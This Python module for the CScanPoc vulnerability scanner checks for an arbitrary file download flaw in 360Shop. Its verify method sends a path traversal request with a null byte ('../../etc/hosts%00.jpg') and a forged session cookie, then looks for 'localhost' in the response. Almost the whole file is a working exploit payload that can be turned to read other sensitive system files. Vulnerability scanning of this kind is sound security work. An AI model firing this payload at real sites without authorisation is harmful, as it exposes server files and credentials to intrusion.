# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = '360Shop_0102'  # 平台漏洞编号
    name = '360SHOP官网任意系统文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_OPERATION  # 漏洞类型
    disclosure_date = '2013-05-13'  # 漏洞公布时间
    desc = '''
    360SHOP官网任意系统文件下载漏洞，攻击者可以通过任意文件下载读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=20885'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '360Shop(启博微分销)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ac0ba9db-b69b-4d4a-b7c8-31d0b545be02'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/?do=../../../../../../../../../../etc/hosts%00.jpg&mod=info&sort_id=6"
            url = self.target + payload
            headers = {
                'Referer': self.target,
                'Cookie': '360shop_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bi%3A-1%3B%7D; 360shop_sid=746af76720565c81fde8ba9339cf61ca; 360shop_validity_time=0; PHPSESSID=tcabp4ii7ub0s9ten0i3vgpgm6; CNZZDATA30061204=cnzz_eid%3D1491477717-1364529672-http%253A%252F%252Fwww.360shop.com.cn%26ntime%3D1364529672%26cnzz_a%3D0%26retime%3D1364530090900%26sin%3Djavascript%253AutvG2HHCGOcZZm98()%253C%253E%26ltime%3D1364530090900%26rtime%3D0',
                'Host': self.target,
                'Connection': 'Keep-alive',
                'Accept-Encoding': 'gzip,deflate',
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Accept': '*/*'
            }
            response = requests.get(url, headers=headers)
            if "localhost" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
